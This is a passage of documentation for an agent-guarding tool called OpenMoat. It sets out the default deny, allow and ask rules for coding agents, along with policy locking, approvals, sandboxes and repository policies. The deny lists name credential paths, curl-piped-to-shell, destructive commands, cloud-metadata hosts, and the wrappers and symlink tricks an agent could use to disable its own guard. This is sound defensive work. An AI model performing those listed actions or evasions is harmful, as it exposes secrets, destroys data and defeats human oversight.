- **Decide-only:** `shell`, `env.read`, `env.set`, `mcp` and `executables`. An OS layer
  cannot see a command line, a variable or a tool name, so only the hook applies these.
- **`ask` becomes deny.** An OS layer can only allow or deny. An `ask` rule, or an `ask`
  default, is denied there. The hook still asks for the tool calls it sees. Each such
  narrowing is listed as a loss.
- **Never wider, except listed allowances.** Whatever a backend cannot represent
  exactly, it narrows and reports. An OS layer is wider than the hook only by an
  allowance (ADR-021): `sandbox.read_roots` (§9), which `policy compile` prints under
  `allowances`, and what a host needs to run, which `moat sandbox show` lists. Network
  to the cloud-metadata hosts (`moat.cloud-metadata`) is denied whatever the policy says.

## 6. The default policy, in one table

| List | Rule id | What it covers |
|---|---|---|
| deny | `secrets-paths` | read **and** write of `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.config/gh`, `~/.netrc`, `~/.docker/config.json`, `~/.config/gcloud`, `~/.azure`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials{,.toml}`, `~/.zsh_history`, `~/.bash_history`, `.env`, `.env.*` (except `.env.example`, `.env.sample`, `.env.template`), `.envrc`, keychains |
| deny | `env-secrets` | reading `*_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `AWS_*`, `GITHUB_TOKEN`, `NPM_TOKEN` |
| deny | `env-dump` | `env`, `printenv`, `set`, `export`, `declare`, `typeset` with no arguments (or only `-0`, `-p`, `-x`), also by absolute path: they print every variable, secrets included. `printenv NAME` is an `env.read` of `NAME` |
| deny | `env-poison` | setting `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`, `NODE_OPTIONS`, `PYTHONPATH`, `GIT_*`, `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `MOAT_*` |
| deny | `pipe-to-shell` | `curl`/`wget` output, or any decoded/decompressed stream (`base64 -d/-D/--decode`, `openssl … -d`, `xxd -r`, `gunzip`, `zcat`, `gzip -d`, …), piped into a shell or interpreter that reads its program from stdin (`sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `python*`, `node`, `perl`, `ruby`, `php`, `deno`, `bun`, `pwsh`); `eval` |
| deny | `destructive` | any write to the home directory or the root itself (`fs.write` of exactly `~` and `/`, however the path is spelt: `~/`, `$HOME`, `${HOME}`, `/Users/me/`, `~/x/..`), so removing, moving or replacing them with any program and flags; this also denies a command that changes that directory itself (`touch ~`, `chmod 700 ~`) or copies into it entries whose names the command line does not show (`rsync -a dist/ ~/`, `cp * ~/`), while a copy or move of named files into it writes those entries (`cp f ~/` writes `~/f` and asks, §3.1), as do writes below them (`mkdir ~/x`, `rm -rf ~/tmp/build`) are unaffected; `rm` of an unexpanded `/*`, `~/*`, `$HOME/*`, `${HOME}/*` or of `//`, and `rm -rf --no-preserve-root`, `git push --force*`/`-f*` (also after the remote, bundled as `-uf`, and a `+refspec` such as `+main` or `+HEAD:main`), remote branch deletion (`git push origin :main`, `--delete`, `-d`), the prefixes of `--force` and `--delete` git accepts as abbreviations (`--for*`, `--de*`; `--mirror` and `--prune` stay at the `push` ask), `git reset --hard`, `git clean -fdx`, `git branch -D`, `git stash drop/clear`, `sudo`, `mkfs`, `dd if=`, `shutdown`, `reboot` |
| deny | `kernel-self` | writes to `~/.moat`, `~/.codex`, anything under a `.moat/` directory, host hook/settings files, and to the directories `~/.moat`, `~/.claude`, `~/.codex`, `~/.cursor` (and `.moat`, `.claude`, `.codex`, `.cursor` anywhere) themselves, and the same paths in the directories `MOAT_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME` and `CURSOR_CONFIG_DIR` name (§3.2), so they cannot be renamed, deleted or replaced by a link; any `bin/moat` or `bin/moat.exe` (the binary every hook runs), and Scoop's `apps/moat/current` junction and `apps/moat/<version>/moat.exe` (ADR-016); `moat policy/init/doctor/allow/edit/trust/uninstall` and `moat sandbox sync` from an agent, also by absolute path (`*/moat …`) and under the pseudo-terminal wrappers `script`, `expect`, `unbuffer` (ADR-011), also by absolute path, Python `pty.spawn(…)`, `tmux`/`screen` and `osascript` (ADR-014); under those wrappers any `moat` command, a bare `moat` included, since its home screen asks questions at a terminal |
| deny | `shell-rc` | writes to `~/.zshrc`, `~/.bashrc`, `~/.profile` and friends |
| deny | `cloud-metadata` | network to instance metadata and link-local services (`169.254.*`, `fe80:*`, `fd00:ec2::254`, `100.100.100.200`, `metadata.google.internal`, `metadata.goog`), for shell network and for a host fetch tool alike |
| allow | `project-fs` | read anywhere in `${project}`, including the root itself (a search with no path); write anywhere except `.git/` and `.moat/` |
| allow | `dev-shell` | `git status/diff/log/show/branch/add/commit/checkout/switch/fetch/pull/rebase/stash`, `ls`, `cat`, `head`, `tail`, `grep`, `rg`, `find`, `pwd`, `echo`, `which`, `true`, `jq`; `cd`, `pushd`, `popd`, `mkdir`, `touch`, `cp`, `mv`, `rm` (their path operands are fs actions resolved through `cd` and symlinks, so outside `${project}` they ask or meet a deny); `npm test/run`, `pnpm test/run/build/lint/typecheck/exec`, `yarn test/run/build/lint/exec`, `cargo build/test/check/clippy/fmt/run/doc/bench/nextest/tree/metadata`, `go test/build/vet`, `swift test/build`, `pytest`, `python -m pytest`, `python3 -m pytest`, `python -m venv`, `python3 -m venv` (each directory operand is an `fs.write`), sourcing the project venv's activate script spelled exactly `.venv/bin/activate` or `venv/bin/activate` (`source` or `.`, no arguments; the script is an `fs.read`, so one outside `${project}` asks), `make` with no arguments, `make test/build/check/lint`. `exec` forms are allowed only because the wrapped program is evaluated on its own. Excluded (they ask): recursive `rm` (`-r`, `-R`, `-rf`, …), `git checkout .`, `git checkout -- …` and forced checkouts (they discard uncommitted work), `find -exec/-ok/-delete/-fprint/-fls`, `rg --pre`, `git --upload-pack/--receive-pack`, `go -exec/-toolexec/-vettool`, `cargo --config`, `git rebase --exec/-x`, `--interactive/-i`, `--edit-todo`, `--continue`, `--skip` (they run or resume a todo list, which may hold `exec` lines) and `--strategy/-s` (runs a `git-merge-<name>` program), long options by any prefix git accepts, `venv --clear` (empties the directory) and `--upgrade`/`--upgrade-deps` |
| allow | `dev-readonly` | `wc`, `diff`, `tree`; `docker ps/images/logs/version`; `gh pr view/list/diff/checks`, `gh issue view/list`, `gh run list/view`, `gh repo view` (not with `--output`/`-o`); reading `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LANG`, `TERM`, `TMPDIR`, `EDITOR` |
| allow | `dev-tools` | `tsc`, `eslint`, `prettier`, `biome`, `vitest`, `jest`, `mocha`, `ruff`, `black`, `mypy`, `golangci-lint` |
| allow | `text-tools` | `sed`, `awk`, `sort`, `uniq`, `cut`; their file operands and the files they write are fs actions, and what the classifier cannot prove read-only (`<program> @<argument>`, §3.1) is excluded and asks |
| allow | `registries` | `api.github.com`, `github.com`, npm, crates.io, Go proxy, PyPI (shell clients and `WebFetch` alike) |
| allow | `safe-mcp` | read-only GitHub and filesystem MCP tools |
| ask | `installs` | `npm install/i/ci`, `pnpm add/install/dlx`, `yarn add/install/dlx`, `npx`, `npm exec`/`npm x` (they download a package they cannot find, like `npx`), `pip install`, `cargo add/install`, `brew install`, `gem install` |
| ask | `local-net` | network to `localhost`, `127.0.0.1`, `::1`, fetches included (a local service may expose a control API) |
| ask | `push` | `git push`, `npm/pnpm/yarn publish`, `cargo publish`, `gh release` |
| defaults | `default`, `default.net`, `default.fetch` | everything else asks; outbound network to unlisted hosts is denied, except a `WebFetch` read of an unlisted URL, which asks (ADR-017) |

MCP calls are judged by name **and** by what their arguments touch: adapters map path-like arguments (`path`, `paths`, `file_path`, `source`, `destination`, …) to `fs.read`/`fs.write` atoms (write for `write_*`, `edit_*`, `move_*`, `delete_*`-shaped tools and for `destination`/`target`) and URL-like arguments (`url`, `uri`, `endpoint`) to `net` atoms, so `mcp__filesystem__read_file {path: ~/.aws/credentials}` is denied by `secrets-paths` even though `safe-mcp` allows the tool name. Arguments are searched down to 8 levels of nesting (`{"options": {"path": …}}`), URL arguments count with or without a scheme, and arguments that cannot be read (a Cursor `tool_input` string that is not JSON, more than 1024 paths and URLs) deny the call instead of letting the name decide alone. Arguments nested deeper than 8 levels are not searched; they may name a file or host, so the call is at least `ask` (rule id `unparseable`, with the limit in the reason), and a `deny` from what was searched still wins.

## 7. Recipes

Allow your company's package registry:
```yaml
allow:
  - id: company-registry
    net: ["npm.internal.example.com", "pypi.internal.example.com"]
```

Let the agent deploy with one script but nothing else in that directory:
```yaml
allow:
  - id: deploy-script
    shell: ["./scripts/deploy.sh *"]
deny:
  - id: deploy-dir
    fs.write: ["${project}/scripts/**"]
```

Make every `git push` require approval, even to `origin HEAD`:
```yaml
ask:
  - id: push
    shell: ["git push *"]
```

Check what a policy would do before installing it:
```bash
moat policy lint ./policy.yaml
moat policy check "npm install left-pad" --policy ./policy.yaml --project ~/code/app
moat policy check "~/.aws/credentials" --kind fs-read --policy ./policy.yaml
```

`policy lint` fails (exit 64) on errors: wrong version, unknown keys, missing or duplicate
ids, empty rules, bad globs or shell patterns, `executables` paths that are not absolute
(`/usr/bin/git` or `C:/…`). It prints warnings, and still exits 0, for rules that cannot
decide anything because an earlier list already matches everything they match: an `ask`
pattern covered by an `allow` pattern (allow is evaluated first, e.g. allow `cargo *` makes
ask `cargo publish*` unreachable), an `allow` pattern covered by a `deny` pattern (a `net`
pattern covers a `fetch` pattern, not the reverse), and
`defaults` keys that are not a known kind (`netw: deny` is silently ignored otherwise). The
check is conservative: a list with `!` exclusions is never assumed to cover anything, so no
warning does not prove a rule is reachable.

## 8. The policy lock

`moat init` records SHA-256 digests of the policy file and of every host hook file it
installed in `~/.moat/policy.lock`. `moat guard` recomputes them on every call; if any
pinned file changed or disappeared, every call is denied with rule `kernel-integrity`
until a person re-pins with `moat doctor --accept` (refused outside an interactive terminal) or
by re-running `moat init`. Edit the policy, then run `moat doctor --accept`. Which hook files are pinned is decided only by `moat init`: it keeps the ones already in the lock and adds those installed in the directories it records (its own `CLAUDE_CONFIG_DIR`, `CODEX_HOME` and `CURSOR_CONFIG_DIR`, else the recorded or default ones). `moat doctor --accept`, `moat allow` and `moat trust` re-pin exactly the files already in the lock, plus OpenMoat's own state files (`trust.json` once `moat trust` writes it), so running them from a shell where those variables differ from the agent's never drops the agent's hook file; `moat doctor` and `moat status` name a hook file installed under the current environment that the lock does not pin, and a pinned one outside it. A pinned file is identified by its location, so replacing it with a symlink, or re-pointing an existing link, counts as a modification even when the bytes read through it are unchanged. The same holds for a directory on its path: if `~/.claude` is moved and replaced by a link to a copy, `settings.json` resolves somewhere else and is reported as modified.

### 8.1 Executable pinning and the environment snapshot

`moat init` also records the search path and the absolute location of common programs
(`git`, `npm`, `node`, `python3`, `cargo`, `curl`, `ssh`, `sudo`, …) in
`~/.moat/environment.json`, pinned by the lock. For every shell command, the first word is
resolved through that snapshot, never through the environment the hook inherited. If the
program is pinned, either by `executables:` in the policy or by the snapshot, and it now
resolves somewhere else (a `git` planted in `node_modules/.bin`, an absolute path to a copy
in `/tmp`), the command is denied with rule `executables`. Unpinned programs are not checked.
After installing a tool in a new location, re-run `moat init` or `moat doctor --accept`.

On Windows the snapshot also records `PATHEXT`; a bare program name resolves as written, then with each recorded extension in order (default `.com`, `.exe`, `.bat`, `.cmd`).

`moat policy check` decides the way `guard` does: it resolves programs through the snapshot
when `~/.moat/environment.json` exists and resolves symlinks in checked paths. Without an
installation, installation pins are not consulted and a program pinned under `executables:`
is reported as "not found on the kernel search path" unless the command names it by
absolute path. Checked against the installed policy (no `--policy`), it also verifies
`policy.lock` first and, when a pinned file changed, reports the `kernel-integrity` deny
(exit 2) that `guard` answers instead of the policy's verdict.

### 8.2 Approvals

When a host prompts you because the verdict was `ask`, you can make the answer stick:

```bash
moat allow --last                  # grant the most recent ask to that host session (exact command or files)
moat allow --last --always         # or add a permanent allow rule
moat allow "npm install left-pad" --host claude-code --session 7c1e
```

Session grants live in `~/.moat/approvals.json` and match the exact command text, or
the exact files and action (read or write) of a file ask, for one host session. File
paths are compared made absolute against the call's working directory, `~` expanded
and `.` and `..` collapsed. A grant applies to any `ask` for that command or those
files, including an `unparseable` one; it never overrides a `deny`. A file ask approved
with `--always` becomes an `fs.read` or `fs.write` rule for exactly its paths, as
asked and with symlinks resolved; a path with glob characters is refused. Hosts do not report when a session ends,
so a grant expires 24 hours after `moat allow` wrote it (granting the same command again
restarts it); `guard` ignores expired grants, every write of `approvals.json` drops them,
and `moat status` shows how many are active and the age of the oldest. A grant written
without a creation time (files from before grants expired) counts as expired.
Permanent rules (`--always`) never expire; they are appended to
`~/.moat/policy.d/approved.yaml` with ids `approved-1`, `approved-2`, … and a provenance
comment, and are merged into your policy at load time so `policy.yaml` is never rewritten.
The command is stored as a literal pattern: glob characters and `$` are escaped (`cat *` is
stored as `cat [*]` and approves only a literal `*`), and ids are numbered one past the
highest existing `approved-N`, so deleting a rule never causes a duplicate id. Shell rules
are prefixes, so a permanently approved `npm install left-pad` also allows extra arguments
after it; edit the overlay if you want it tighter. Both files are pinned
by the lock; `moat allow` must be run from a terminal and is denied to agents.
`moat allow` verifies the lock before writing anything: if a pinned file (policy,
overlay, approvals, hook file) drifted, it lists each one and exits 64 without changing
the overlay, the grants or the lock. Review the changes with `moat doctor` and accept them
with `moat doctor --accept`, then approve again; approving a command never accepts drift.

```bash
moat allow --site docs.rs          # net: [docs.rs], network access to that host, fetches included
moat allow --dir ~/work/shared     # fs.read and fs.write of the directory and everything below it
moat allow --remove approved-3     # take a permanent rule out again
```

`--site` and `--dir` append a rule to the same overlay, check that the merged policy still
lints, re-pin, and print the rule as written plus the `--remove` command that undoes it.
`--site` takes a plain host name or address only (no wildcard, scheme or port; write those
with `moat edit`). `--dir` must name an existing directory; it is stored as written and,
when that differs, with its symlinks resolved, since the hook checks a path both ways. The
home directory, its ancestors and filesystem roots are refused, as are names with glob
characters. Deny rules still win, so `.env` files and keys inside an allowed directory stay
denied and `kernel-self` paths stay protected. `--remove` takes any `approved-N` id,
including one `--always` wrote.

`moat edit` opens `~/.moat/policy.yaml` in `$VISUAL`, `$EDITOR` or `vi` (`notepad` on
Windows) on a copy inside `~/.moat`. When the editor exits, an unchanged copy changes
nothing; a copy that does not lint (with the overlay merged, as `guard` loads it) is
reported and never written, and you can reopen it. Otherwise `moat edit` prints the lint
warnings and a unified diff and asks `Apply? [y/N]`; only `y` writes the policy, keeps the
previous one in `~/.moat/policy.yaml.bak` and re-pins. Like `moat allow` it needs a
terminal, refuses over a drifted lock, and is denied to agents by `kernel-self`.

## 9. Host sandboxes (`sandbox:`)

`moat init` and `moat sandbox sync` compile the policy into each host's own sandbox
(Standard tier, ADR-018, ADR-019). The rules above apply there as an OS layer can apply
them: a deny rule denies; an allow rule allows; everything else, `ask` included, is
denied. Shell, `env.*`, `mcp` and `executables` rules have no OS form and stay with the
hook.

A deny-by-default read would also deny the toolchains and system files every command
reads, so the additive `sandbox.read_roots` key lists the paths sandboxed commands may
read although no allow rule covers them:

- Absolute or `~/…`, a directory or a file, never a glob, `.`/`..`, a filesystem root
  or the home directory itself (`policy lint` rejects them). Each root covers itself and
  everything below it. Missing paths are harmless.
- Only OS layers use the list. The hook keeps deciding these reads by the rules, so
  `cat ~/.cargo/registry/…` still asks; deny rules win inside a root in every layer
  (`~/.cargo/credentials.toml` stays denied).
- This is the one way an OS layer is wider than the hook (ADR-019), and `moat sandbox
  show` prints it as an allowance. The default policy lists system directories
  (`/usr`, `/bin`, `/etc`, `/opt`, `/System`, `/Library`, `/nix`, …), temp directories
  and toolchain homes (`~/.cargo`, `~/.rustup`, `~/.npm`, `~/.nvm`, `~/.pyenv`,
  `~/.local/bin`, `~/go`, `~/.gitconfig`). A policy without a `sandbox:` section gets
  that list, and `sandbox show` says so.

**Network through `moat proxy` is opt-in.** By default each host's own proxy enforces
the `net` rules' domain names: Claude Code's `allowedDomains` with `strictAllowlist`,
and Codex's `network.domains`. Neither host's sandbox allows a direct connection.

Set the additive `sandbox.proxy_port` key (1–65535) to send sandboxed commands'
traffic through `moat proxy` (§5.2) on `127.0.0.1:<port>` instead. `moat proxy`
without `--listen` then uses that port, and the policy lock pins it with the rest of
the file.

| | What you gain | What it costs |
|---|---|---|
| `moat proxy` | Every connection is decided by the full policy (address patterns too, not only domain names) and recorded in the audit log. Brokered secrets (§2.1) are injected. Loopback, link-local, metadata and unnamed private addresses are refused after DNS. | `moat proxy` must be running. While it is stopped, Claude Code's sandboxed commands have no network (`npm install`, `cargo build` and `git fetch` fail), and `moat doctor` and `moat status` warn. Programs that speak only SOCKS5 have none at all. |

Keep the proxy running as a user service, for example a launchd agent or a systemd
user unit running `moat proxy`. `moat init` cannot install one yet (#272); routing
through `moat proxy` stays opt-in until it can.

Codex's own proxy still decides Codex's commands. It hands what it allows on to `moat
proxy` only when Codex starts with `HTTP_PROXY` and `HTTPS_PROXY` set to
`http://127.0.0.1:<port>`, and its API hosts then need an allow rule (THREAT_MODEL.md §5).

What each host enforces for sandboxed commands after `moat init` with the default
policy:

| | Claude Code (`Bash`, `PowerShell`, `Monitor`) | Codex (every command) |
|---|---|---|
| Read | project, read roots, paths outside the user directories; never `secrets-paths` | project, read roots, Codex's minimal system paths; never `secrets-paths` |
| Write | working directories, temp; never `secrets-paths`, `kernel-self`, `shell-rc`, `.moat`, or what in `.git` makes git run code (`hooks`, `config`, `config.worktree`, `info/attributes`, a worktree's `commondir`, the same in submodules) | project, temp; the same denies; `.git` read-only |
| Network | `registries` domains only (`strictAllowlist`); `cloud-metadata` denied; no direct connection. With `sandbox.proxy_port`: through `moat proxy` only | the same, through Codex's network proxy; with `sandbox.proxy_port`, on to `moat proxy` when Codex runs with `HTTP(S)_PROXY` |
| Escape hatches | `allowUnsandboxedCommands: false`, `failIfUnavailable: true`, no `excludedCommands` | `default_permissions = "moat"`; Codex asks before running outside the sandbox |

Losses (stricter than the policy): the `.env.example`, `.env.sample` and `.env.template`
exceptions cannot be re-allowed inside the `**/.env.*` deny; `.git` is read-only for
Codex's sandboxed commands; every `.moat` is denied under Claude Code, whose user
settings cannot name the project; Claude Code's file tools refuse reads outside the
working directories; with `sandbox.proxy_port`, Claude Code's sandboxed commands
have no network without `moat proxy` and none over SOCKS5. Allowances (wider): with
`sandbox.proxy_port`, Codex's traffic skips `moat proxy` unless Codex runs with
`HTTP(S)_PROXY`; the read roots, Codex `:minimal` and
`:tmpdir`, Claude Code's working directories, system paths, the directory-node
rules of `kernel-self` (`**/.claude` itself; the files below stay denied) and, so
that `git commit` works, writes to every `.git` under Claude Code except the paths
above (`claude-code.git-internals`; the hook still asks for file-tool writes to the
project's `.git`). Run
`moat sandbox show` for the exact list your policy produces.

## 10. Repository policy

A project can commit rules for everyone who works in it: `<project>/.moat/policy.yaml`,
where the project is the git root that `${project}` names (§3.2). A repository is input
you did not write, so by itself its policy can only make yours stricter. Its allow rules
apply only after you trust that exact file with `moat trust` (ADR-022).

```yaml
version: 1
deny:
  - id: no-prod-deploy
    shell: ["./scripts/deploy.sh prod*"]
ask:
  - id: migrations
    fs.write: ["${project}/db/migrations/**"]
```

- Only `version`, `deny`, `ask` and `allow` are accepted. `defaults`, `executables` and
  `sandbox` stay yours, and any other key is an error. Rules follow §1–§3.
- `deny` groups join your deny rules. `ask` groups are tried after your deny rules and
  before your allow rules. So they make an action your policy allows ask, but they
  never soften one of your denies. Per atomic action the result is the stricter of
  the two policies.
- `allow` groups are ignored until you trust the file. Trusted, they are added after
  your allow rules, so your deny rules (`secrets-paths`, `kernel-self`, …) still win.
  They can widen your `ask` rules and defaults.
- Every repository rule id is shown with the prefix `repo:` (`repo:no-prod-deploy`) in
  responses, the audit log and `moat show`. This way a repository rule cannot pose as
  one of yours.
- A file that cannot be read or parsed, that sets a key it may not set, or that is not
  a regular file denies every tool call in the project with `kernel-error` and the
  reason. Fix the file to go on. OpenMoat never ignores it, because ignoring it would
  silently drop the team's deny rules.
- `moat policy check` without `--policy` decides with it, as `guard` does. With
  `--policy`, only that file is used.
- Agents cannot change it: `kernel-self` denies writes to `**/.moat/**`.
- Hook only. Host sandboxes (§9) and `moat proxy` are generated from your policy,
  per user and not per repository. A repository deny is not enforced there, and a
  trusted repository allow does not widen them.

```bash
moat trust                   # trust the repository policy of the current directory's project
moat trust ~/code/app        # or of another project
moat trust --revoke          # its allow rules stop applying; deny and ask stay
```

`moat trust` prints each allow rule it lets in. It records the SHA-256 of the file's
bytes against the project root (symlinks resolved) in `~/.moat/trust.json`, never in
the repository, and re-pins the lock. The record holds for that exact file in that
exact checkout. After any change to the file (a pull, a branch switch, an edit), or for
a copy in another directory, the policy applies in its tightening-only form until you
run `moat trust` again. A file that does not parse cannot be trusted. Like `moat
allow`, `moat trust` must be run from a terminal, refuses while the lock shows drift
(exit 64), and is denied to agents by `kernel-self`. A `trust.json` the lock does not
pin is ignored.

`moat status` and `moat doctor`, run inside the project, name the repository policy and
its digest, and say which form applies: `trusted`, `not trusted: tightening only`,
`changed since moat trust: tightening only`, or `tightening only` for a file without
allow rules. A file that does not parse is reported as a problem (exit 64), because
every call in the project is denied.
